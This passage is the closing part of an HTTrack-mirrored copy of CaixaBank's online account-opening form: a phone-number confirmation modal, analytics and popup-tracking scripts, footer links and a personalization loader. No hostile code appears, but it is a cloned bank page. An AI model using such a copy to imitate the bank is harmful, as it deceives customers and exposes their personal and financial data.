<div class="c-modal__header"><img  alt="" class="d-b m0auto mb25" height="47" src="deployedfiles/particulares/Estaticos/Imagenes/apl/AltaClienteOnline/ic_modal_info_x128.png" width="47">
<h2 class="cs-heading-modal-title block-spacer-bottom-2">&iquest;Puedes confirmar que este es tu tel&eacute;fono m&oacute;vil?</h2>
</div>
<div class="c-modal__body">
<p class="mb20">Aseg&uacute;rate de que sea correcto, lo necesitar&aacute;s para firmar tus contratos al final del proceso.</p>
<p class="mb30" id="telefonoPopup"></p>
</div>
<div class="c-modal__footer">
<div class="v-center-bottom"><button type="button" class="button blue mb20 close-cb" onclick="cleanTelefono(); $('#AltaClienteCBK100DatosMinimos').trigger('submit');$('.l-loader').addClass('active');"><span class="button__label">S&iacute;, es este</span></button>
<p class="mb30"><a class="close-cb" title="Cambiar de m&oacute;vil" onclick="cleanTelefono();">Cambiar de m&oacute;vil</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
s.products = ";Alta cuenta CaixaBank";
s.events = "event1,event11,event29";
s.prop70 = '';
s.eVar82 = s.prop70;
$(window).on('load', function () {
enviarEventoSuccess('1669929374_Forms','AltaClienteCBK100DatosMinimos');
});
var popups = { productos:false, pensiones:false, info:false };
$(".productos .cbox-close.ic_info.fr").on('click', function() {
onClickSC("articulos_nomina");
lanzaPopupSC("articulos_nomina");
popups.productos=true;
});
$(".pensiones .cbox-close.ic_info.fr").on('click', function() {
onClickSC("articulos_planes");
lanzaPopupSC("articulos_planes");
popups.pensiones=true;
});
$(".cbox-close.ic_info.fl,#link_info").on('click', function() {
onClickSC("info");
lanzaPopupSC("info");
popups.info=true;
});
$(this).on("cbox_complete",function(e) {
$("#cboxContent button#cboxClose").on('click', function() {   if (popups.productos) { onClickSC('articulos_cerrar'); popups.productos = false;
} else if (popups.pensiones) { onClickSC('articulos_cerrar'); popups.pensiones = false;
} else if (popups.info) { onClickSC('info_cerrar'); popups.info = false;
}
});
$("#cboxContent iframe").on("load",function(e) {        $(this).contents().find(".button .close-cb").on('click', function() {
if (popups.info) { onClickSC('info:Entendido'); popups.info = false;
}
});
});
});
</script>
</div>
</div>
</div>
</div>
</div>
</div>
<div  class='freeContent l-main-nav' >
<div  class='container' >
<div  class='row center-col' >
<div  class='column col-md-8 col-xs-12' >
</div>
</div>
</div>
</div>
</div>
<div  class='freeContent l-footer' >
<footer id='footer' class='freeContent footer' >
<div  class='container' >
<div  class='row' >
<div  class='column col-md-8 col-xs-12' >
<div class="linkgroup-text-footer">
<div class="head-linkgroup-text-footer">
<p>© CaixaBank, S.A. 2022</p>
</div>
<div class="link-text-footer">
<ul>
<li class="item">
<a  href="https://www4.caixabank.es/particular/general/cookies_es.html" target="_blank" onclick="neoEventSC(pageNameValue + ':' + 'PoliticaCookies', pageNameValue +',' + 'click en empty section' + ',' + 'PoliticaCookies');"      title="Pol&iacute;tica de cookies (abre en ventana nueva)"  >Política de cookies</a>
</li>
<li class="item">
<a  href="https://www.caixabank.com/informacionprivacidad" target="_blank" onclick="neoEventSC(pageNameValue + ':' + 'PrivacidadSpanClassSrOnlyAbreVentanaNuevaSpan', pageNameValue +',' + 'click en empty section' + ',' + 'PrivacidadSpanClassSrOnlyAbreVentanaNuevaSpan');"      title="Privacidad (Abre en una ventana nueva)"  >Privacidad<span class="sr-only"> (abre en una ventana nueva)</span></a>
</li>
<li class="item">
<a  href="https://www4.caixabank.es/particular/general/avisolegal_es.html" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'AvisoLegal', pageNameValue +',' + 'click en empty section' + ',' + 'AvisoLegal');"      title="Aviso legal"  >Aviso legal</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/infoclientes_es.html" target="_blank" onclick="neoEventSC(pageNameValue + ':' + 'TarifasEInformacionInteres', pageNameValue +',' + 'click en empty section' + ',' + 'TarifasEInformacionInteres');"      title="Tarifas e informaci&oacute;n de inter&eacute;s"  >Tarifas e información de interés</a>
</li>
<li class="item">
<a  href="https://www4.caixabank.es/particular/general/mifid_es.html" target="_blank" onclick="neoEventSC(pageNameValue + ':' + 'Mifid', pageNameValue +',' + 'click en empty section' + ',' + 'Mifid');"      title="MIFID"  >MIFID</a>
</li>
<li class="item">
<a  href="https://www4.caixabank.es/particular/general/informacionlegal_es.html" target="_blank" onclick="neoEventSC(pageNameValue + ':' + 'InformacionLegalCaixabankSA', pageNameValue +',' + 'click en empty section' + ',' + 'InformacionLegalCaixabankSA');"      title="Informaci&oacute;n legal sobre Caixabank, S.A.(abre en ventana nueva)"  >Información legal sobre CaixaBank, S.A.</a>
</li>
</ul>
</div>
</div>
</div>
<div  class='column col-md-4 col-xs-12' >
<div class="linkgroup-images-footer">
<ul>
<li class="item">
<a  href="http://certiaccesibilidad.technosite.es/Recursos/Certificado.aspx?codigo=yzrruhirhsdmtwcvjrda938433810YZRRUHIRHSDMTWCVJRDAU#Ilunion" target="_blank" onclick="neoEventSC(pageNameValue + ':' + 'CertificacionIlunionTecnologiaYAccesibilidadAbreNuevaVentana', pageNameValue +',' + 'click en empty section' + ',' + 'CertificacionIlunionTecnologiaYAccesibilidadAbreNuevaVentana');"      title="Certificaci&oacute;n ILUNION Tecnolog&iacute;a y Accesibilidad (abre en nueva ventana)"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Estaticos/Imagenes/Home/ilunion_logo.jpg"   alt='ILUNION Tecnolog&iacute;a y Accesibilidad, Certificaci&oacute;n WCAG-WAI AA (Abre en ventana nueva)' width="93" height="27" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/premios_es.html#anab" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'AnabAccredited', pageNameValue +',' + 'click en empty section' + ',' + 'AnabAccredited');"      title="ANAB Accredited"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Pruebas/R2016/Estaticos/imgs/iso_anab_47x24.png"   alt='ANAB Accredited' width="47" height="24" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/premios_es.html#excelencia" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'SelloExcelenciaEfqm', pageNameValue +',' + 'click en empty section' + ',' + 'SelloExcelenciaEfqm');"      title="Sello de Excelencia EFQM"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Pruebas/R2016/Estaticos/imgs/efqm.png"   alt='Sello de Excelencia EFQM (Abre en ventana nueva)' width="22" height="30" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/reconocimientos_es.html#euromoney" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'WesternEuropeSBestDigitalBank2020', pageNameValue +',' + 'click en empty section' + ',' + 'WesternEuropeSBestDigitalBank2020');"      title="Western Europe's best digital bank 2020"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Estaticos/Imagenes/Home/AFE_2020_47.jpg"   alt='Western Europe's best digital bank 2020' width="40" height="27" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/reconocimientos_es.html#bai" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'BancoMasInnovador', pageNameValue +',' + 'click en empty section' + ',' + 'BancoMasInnovador');"      title="Banco m&aacute;s innovador"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Estaticos/Imagenes/Home/GLOBAL_AWARDS_ICON_WINNER.png"   alt='Banco m&aacute;s innovador (Abre en ventana nueva)' width="46" height="33" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/premios_es.html#bsi" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'CertificacionIso', pageNameValue +',' + 'click en empty section' + ',' + 'CertificacionIso');"      title="Certificaci&oacute;n ISO"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Pruebas/R2016/Estaticos/imgs/logo_iso.jpg"   alt='Certificaci&oacute;n ISO' width="47" height="24" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://www.caixabank.es/particular/general/premios_es.html#aqmetrix" target="_self" onclick="neoEventSC(pageNameValue + ':' + 'Aqmetrix', pageNameValue +',' + 'click en empty section' + ',' + 'Aqmetrix');"      title="AQmetrix"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/Estaticos/Imagenes/Home/aqemetrix_32x24.png"   alt='AQmetrix' width="32" height="7" class="lazy-load" >
</a>
</li>
<li class="item">
<a  href="https://ssl.comodo.com/" target="_blank" onclick=""  rel='noopen'    title="COMODO SECURE LOGO"  >
<img  src="deployedfiles/common/R2016/Estaticos/images/fff.png" data-src="/deployedfiles/particulares/CSS/img/comodo_secure_seal_100x85_transp.png"   alt="" width="100" height="85" class="lazy-load" >
</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
<div  class='freeContent l-bottom' >
<div  class='freeContent l-cmb bottom_sticky' >
</div>
</div>
</div>
<!--
=======================================================================
Track dependencies
=======================================================================
-->
<script src="deployedfiles/common/R2016/Estaticos/js/lib/mustache.min.js" type="text/javascript" ></script>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/owl.carousel.min.css" rel="stylesheet" media="(max-width: 768px)"></link>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/owl.theme.default.min.css" type="text/css" rel="stylesheet" media="(max-width: 768px)"></link>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/owl.carousel.min.js" type="text/javascript" ></script>
<div id="personalization-1eb8df85afc1b610VgnVCM1000001638f70aRCRD"></div>
<script type="text/javascript">
if(window.jQuery){
//if(true){
if(window.CookiePolicy  &&  CookiePolicy.isAllowedComponent("NeoCampaingsPesonalization", true)){
$("#personalization-1eb8df85afc1b610VgnVCM1000001638f70aRCRD").replaceWith("<script type=\"text\/javascript\" src=\"\/deployedfiles\/common\/JavaScript\/aplnr\/personalization\/personalization.js\"><\/script>\n        <script type=\"text\/javascript\">\n            var neoPersonalization = {\"landingId\":\"1eb8df85afc1b610VgnVCM1000001638f70aRCRD\",\"productId\":null};\n            var personalization = personalization || {};\n            if(window.jQuery && window.Cookies){\n                $( document ).ready(function() {\n                    personalization = Personalization();\n                    personalization.storeContext();\n                });\n            };\n        <\/script>");
}
else {
$("#personalization-1eb8df85afc1b610VgnVCM1000001638f70aRCRD").remove();
}
}
</script>
<script type="text/javascript">
function prependPlugin(htmlElement, beginPluginText, pluginCode, endPluginText){
$(htmlElement).prepend(endPluginText);
$(htmlElement).prepend(pluginCode);
$(htmlElement).prepend(beginPluginText);
}
function appendPlugin(htmlElement, beginPluginText, pluginCode, endPluginText){
$(htmlElement).append(beginPluginText);
$(htmlElement).append(pluginCode);
$(htmlElement).append(endPluginText);
}
</script>
</body>

<!-- Mirrored from www4.caixabank.es/apl/formularios/altaclientecbk100/index_es.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 26 Sep 2022 15:32:02 GMT -->
</html>
